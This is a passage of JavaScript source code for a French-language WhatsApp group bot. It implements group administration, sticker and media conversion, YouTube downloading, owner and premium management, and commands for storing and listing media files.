                if (/webp/.test(mime)) return replyGroup(`Envoyez/Répondez à une image avec la légende ${prefix + command}`)
                var medis = await KervensKingBot.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await KervensKingBot.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyGroup(mess.done)
                } else {
                    var memeg = await KervensKingBot.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyGroup(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'vide'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                KervensKingBot.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                KervensKingBot.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                if (!isAdmins) return replyGroup(mess.admin)
                if (!m.quoted) return replyGroup(`Répondez à un message avec la légende ${prefix + command}`)
                KervensKingBot.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                if (args[0] === 'close') {
                    await KervensKingBot.groupSettingUpdate(m.chat, 'announcement').then((res) => replyGroup(`Groupe fermé avec succès 🕊️`)).catch((err) => replyGroup(json(err)))
                } else if (args[0] === 'open') {
                    await KervensKingBot.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyGroup(`Groupe ouvert avec succès 🕊️`)).catch((err) => replyGroup(json(err)))
                } else {
                    replyGroup(`Mode ${command}\n\n\nTapez ${prefix + command} open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                if (args[0] === 'open') {
                    await KervensKingBot.groupSettingUpdate(m.chat, 'unlocked').then((res) => replyGroup(`Édition des infos du groupe ouverte avec succès 🕊️`)).catch((err) => replyGroup(json(err)))
                } else if (args[0] === 'close') {
                    await KervensKingBot.groupSettingUpdate(m.chat, 'locked').then((res) => replyGroup(`Édition des infos du groupe fermée avec succès 🕊️`)).catch((err) => replyGroup(json(err)))
                } else {
                    replyGroup(`Mode ${command}\n\n\nTapez ${prefix + command} on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                let response = await KervensKingBot.groupInviteCode(m.chat)
                KervensKingBot.sendText(m.chat, `👥 *INFORMATIONS DU LIEN DE GROUPE*\n📛 *Nom :* ${groupMetadata.subject}\n👤 *Propriétaire du groupe :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Inconnu'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Lien du chat :* https://chat.whatsapp.com/${response}\n👥 *Membres :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyGroup(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyGroup(mess.admin)
                if (!isBotAdmins) return replyGroup(mess.botAdmin)
                await KervensKingBot.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyGroup(`Lien d'invitation du groupe ${groupMetadata.subject} réinitialisé avec succès`)
                    }).catch((err) => replyGroup(json(err)))
                break
                case 'p':
            case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Vitesse de réponse ${latensi.toFixed(4)} _Secondes_ \n ${oldd - neww} _millisecondes_\n\nTemps de fonctionnement : ${runtime(process.uptime())}

💻 Informations du serveur
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_Utilisation de la mémoire NodeJS_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Utilisation totale du CPU_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_Utilisation des cœurs du CPU (${cpus.length} cœurs)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await KervensKingBot.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${latensi.toFixed(4)} Secondes`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Salut ${pushname}👋\nTu veux acheter un abonnement premium? Parle juste avec le propriétaire😉`
                await KervensKingBot.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `Le bot fonctionne depuis ${runtime(process.uptime())}`
                KervensKingBot.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `OUBLIEZ LE DON`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                KervensKingBot.sendMessage(m.chat, {
                    text: `Bonjour le monde`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `LE SCRIPT DE ${botname} est sur YouTube @Kervens`,
                            thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `Salut frère ${pushname}\n\nPeu importe le montant, votre don est très précieux pour nous`
                KervensKingBot.sendMessage(m.chat, {
                    text: 'Paypal: https://www.paypal.me/kervensking\n\n' + textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
const repf = await KervensKingBot.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
KervensKingBot.sendMessage(from, { text : `Salut @${sender.split("@")[0]}, Voici mon beau propriétaire😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyGroup(`Répondez à une vidéo/image avec la légende ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await KervensKingBot.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyGroup('Maximum 10 secondes!')
                    let media = await quoted.download()
                    let encmedia = await KervensKingBot.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyGroup(`Envoyez des images/vidéos avec les légendes ${prefix + command}\nDurée de la vidéo 1-9 secondes`)
                }
            }
            break
            case 'smeme': {
                let respond = `Envoyez/Répondez à une image/sticker avec la légende ${prefix + command} texte1|texte2`
                if (!/image/.test(mime)) return replyGroup(respond)
                if (!text) return replyGroup(respond)
                replyGroup(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await KervensKingBot.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await KervensKingBot.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replyGroup(`Où est le texte?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
KervensKingBot.downloadAndSaveMediaMessage(quoted, "gifee")
KervensKingBot.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await KervensKingBot.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyGroup('Maximum 10 secondes!')
let media = await quoted.download()
let encmedia = await KervensKingBot.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replyGroup(`Photo/Vidéo?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyGroup(`Répondez à un sticker avec la légende *${prefix + command}*`)
                replyGroup(mess.wait)
                let media = await KervensKingBot.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    KervensKingBot.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replyGroup(`Répondez à un sticker avec la légende *${prefix + command}*`)
                replyGroup(mess.wait)
                let media = await KervensKingBot.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await KervensKingBot.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Converti Webp en Vidéo'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyGroup(`Envoyez/Répondez à une vidéo/audio que vous voulez convertir en audio avec la légende ${prefix + command}`)
                replyGroup(mess.wait)
                let media = await KervensKingBot.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                KervensKingBot.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyGroup(`Envoyez/Répondez à une vidéo/audio que vous voulez convertir en MP3 avec la légende ${prefix + command}`)
                replyGroup(mess.wait)
                let media = await KervensKingBot.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                KervensKingBot.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `kervens.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyGroup(`Répondez à une vidéo/audio que vous voulez convertir en VN avec la légende ${prefix + command}`)
                replyGroup(mess.wait)
                let media = await KervensKingBot.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                KervensKingBot.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replyGroup(`Répondez à un sticker avec la légende *${prefix + command}*`)
                replyGroup(mess.wait)
                let media = await KervensKingBot.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await KervensKingBot.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Converti Webp en Vidéo'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replyGroup(mess.wait)
                let media = await KervensKingBot.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replyGroup(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replyGroup(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyGroup(`Exemple : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replyGroup(`Exemple : ${prefix + command} 😅+🤔`)
                replyGroup(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await KervensKingBot.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replyGroup(`Répondez à une image/vidéo`)
                if (/image/.test(mime)) {
                    anuan = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
                    KervensKingBot.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Voilà !`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
                    KervensKingBot.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Voilà !`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replyGroup('Veuillez inclure un lien ou un texte!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await KervensKingBot.sendMessage(from, {
                    image: medi,
                    caption: "Voilà !"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replyGroup(`Exemple:\n${prefix}fliptext Kervens`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replyGroup(`\`\`\`「 TEXTE INVERSÉ 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Inversé :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *Liste Vn* 」\n│\n'
                for (let x of VoiceNoteKerven) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteKerven.length}*`
                replyGroup(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *Liste Sticker* 」\n│\n'
                for (let x of StickerKerven) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerKerven.length}*`
                replyGroup(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *Liste Image* 」\n│\n'
                for (let x of ImageKerven) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageKerven.length}*`
                replyGroup(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *Liste Vidéo* 」\n│\n'
                for (let x of VideoKerven) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoKerven.length}*`
                replyGroup(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replyGroup(mess.owner)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await KervensKingBot.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyGroup(`Entrez un numéro valide et enregistré sur WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyGroup(`Le numéro ${bnnd} est devenu un propriétaire!!!`)
break
case 'delowner':
                if (!isCreator) return replyGroup(mess.owner)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyGroup(`Le numéro ${ya} a été supprimé de la liste des propriétaires par le propriétaire!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replyGroup(mess.prem)
                if (args.length < 1) return replyGroup('Nom de la vidéo?')
                if (VideoKerven.includes(q)) return replyGroup("Le nom que vous avez entré existe déjà")
                let delb = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
                VideoKerven.push(q)
                await fsx.copy(delb, `./modsMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoKerven))
                fs.unlinkSync(delb)
                replyGroup(`Vidéo ajoutée avec succès\nPour voir tapez ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replyGroup(mess.prem)
                if (args.length < 1) return replyGroup('Entrez le nom de la vidéo')
                if (!VideoKerven.includes(q)) return replyGroup("Le nom n'existe pas dans la base de données")
                let wanu = VideoKerven.indexOf(q)
                VideoKerven.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoKerven))
                fs.unlinkSync(`./modsMedia/video/${q}.mp4`)
                replyGroup(`Vidéo ${q} supprimée avec succès`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replyGroup(mess.prem)
                if (args.length < 1) return replyGroup('Le nom de l\'image?')
                if (ImageKerven.includes(q)) return replyGroup("Le nom que vous avez entré est déjà enregistré dans la base de données")
                let delb = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
                ImageKerven.push(q)
                await fsx.copy(delb, `./modsMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageKerven))
                fs.unlinkSync(delb)
                replyGroup(`Image ajoutée avec succès\nPour vérifier tapez ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replyGroup(mess.prem)
                if (args.length < 1) return replyGroup('Entrez le nom de l\'image')
                if (!ImageKerven.includes(q)) return replyGroup("Le nom d'image que vous avez entré n'est pas enregistré")
                let wanu = ImageKerven.indexOf(q)
                ImageKerven.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageKerven))
                fs.unlinkSync(`./modsMedia/image/${q}.jpg`)
                replyGroup(`Image ${q} supprimée avec succès`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replyGroup(mess.prem)
                if (args.length < 1) return replyGroup('Entrez le nom du sticker?')
                if (StickerKerven.includes(q)) return replyGroup("Nom déjà utilisé")
                let delb = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
                StickerKerven.push(q)
                await fsx.copy(delb, `./modsMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerKerven))
                fs.unlinkSync(delb)
                replyGroup(`Sticker ajouté avec succès\nPour vérifier tapez ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replyGroup(mess.prem)
                if (args.length < 1) return replyGroup('Entrez le nom du sticker')
                if (!StickerKerven.includes(q)) return replyGroup("Nom non enregistré dans la base de données")
                let wanu = StickerKerven.indexOf(q)
                StickerKerven.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerKerven))
                fs.unlinkSync(`./modsMedia/sticker/${q}.webp`)
                replyGroup(`Sticker ${q} supprimé avec succès`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replyGroup(mess.prem)
                if (args.length < 1) return replyGroup('Entrez le nom?')
                if (VoiceNoteKerven.includes(q)) return replyGroup("Nom déjà utilisé")
                let delb = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
                VoiceNoteKerven.push(q)
                await fsx.copy(delb, `./modsMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteKerven))
                fs.unlinkSync(delb)
                replyGroup(`Audio ajouté avec succès\nPour vérifier tapez ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replyGroup(mess.prem)
                if (args.length < 1) return replyGroup('Entrez le nom')
                if (!VoiceNoteKerven.includes(q)) return replyGroup("Nom non enregistré dans la base de données")
                let wanu = VoiceNoteKerven.indexOf(q)
                VoiceNoteKerven.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteKerven))
                fs.unlinkSync(`./modsMedia/audio/${q}.mp3`)
                replyGroup(`Audio ${q} supprimé avec succès`)
            }
            break
case 'addzip':{
if (!isPremium) return replyGroup(mess.prem)
await loading()
if (args.length < 1) return replyGroup(`Quel est le nom du zip?`)
let teks = `${text}`
{
if (ZipKerven.includes(teks)) return replyGroup("Ce nom est déjà utilisé")
let delb = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
ZipKerven.push(teks)
await fsx.copy(delb, `./modsMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipKerven))
fs.unlinkSync(delb)
replyGroup(`Zip ajouté avec succès\nPour vérifier tapez ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replyGroup(mess.prem)
await loading()
if (args.length < 1) return replyGroup('Entrez le texte dans la liste des zip')
let teks = `${text}`
{
if (!ZipKerven.includes(teks)) return replyGroup("Ce nom n'existe pas dans la base de données")
let wanu = ZipKerven.indexOf(teks)
ZipKerven.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipKerven))
fs.unlinkSync(`./modsMedia/zip/${teks}.zip`)
replyGroup(`Zip ${teks} supprimé avec succès`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *LISTE ZIP* 」\n│\n'
for (let x of ZipKerven) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipKerven.length}*`
replyGroup(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replyGroup(mess.prem)
await loading()
if (args.length < 1) return replyGroup('Quel est le nom de l\'apk?')
let teks = `${text}`
{
if (ApkKerven.includes(teks)) return replyGroup("Ce nom est déjà utilisé")
let delb = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
ApkKerven.push(teks)
await fsx.copy(delb, `./modsMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkKerven))
fs.unlinkSync(delb)
replyGroup(`Apk ajouté avec succès\nPour vérifier tapez ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replyGroup(mess.prem)
await loading()
if (args.length < 1) return replyGroup('Nom de l\'apk?')
let teks = `${text}`
{
if (!ApkKerven.includes(teks)) return replyGroup("Ce nom n'existe pas dans la base de données")
let wanu = ApkKerven.indexOf(teks)
ApkKerven.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkKerven))
fs.unlinkSync(`./modsMedia/apk/${teks}.apk`)
replyGroup(`Apk ${teks} supprimé avec succès`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *LISTE APK* 」\n│\n'
for (let x of ApkKerven) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkKerven.length}`
replyGroup(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replyGroup(mess.prem)
await loading()
if (args.length < 1) return replyGroup('Quel est le nom du pdf')
let teks = `${text}`
{
if (DocKerven.includes(teks)) return replyGroup("Ce nom est déjà utilisé")
let delb = await KervensKingBot.downloadAndSaveMediaMessage(quoted)
DocKerven.push(teks)
await fsx.copy(delb, `./modsMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocKerven))
fs.unlinkSync(delb)
replyGroup(`Pdf ajouté avec succès\nPour vérifier tapez ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replyGroup(mess.prem)
await loading()
if (args.length < 1) return replyGroup('Entrez le nom')
let teks = `${text}`
{
if (!DocKerven.includes(teks)) return replyGroup("Ce nom n'existe pas dans la base de données")
let wanu = DocKerven.indexOf(teks)
DocKerven.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocKerven))
fs.unlinkSync(`./modsMedia/doc/${teks}.pdf`)
replyGroup(`Pdf ${teks} supprimé avec succès`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *LISTE PDF* 」\n│\n'
for (let x of DocKerven) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocKerven.length}*`
replyGroup(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replyGroup(mess.group)
                if (isAfkOn) return replyGroup("Déjà afk")
                let reason = text ? text : 'Rien.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replyGroup(`@${m.sender.split('@')[0]} est actuellement AFK\nRaison : ${reason}`)
                break
case 'play':  case 'song': {
if (!text) return replyGroup(`Exemple : ${prefix + command} statut whatsapp anime`)
const kervenplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await kervenplaymp3.mp3(anup3k.url)
await KervensKingBot.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio":
const kervenaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !kervenaudp3.isYTUrl(text)) return replyGroup(`Où est le lien yt?\nExemple: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await kervenaudp3.mp3(text)
await KervensKingBot.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const kervenvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !kervenvidoh.isYTUrl(text)) replyGroup(`Où est le lien??\n\nExemple : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await kervenvidoh.mp4(text)
const ytc=`
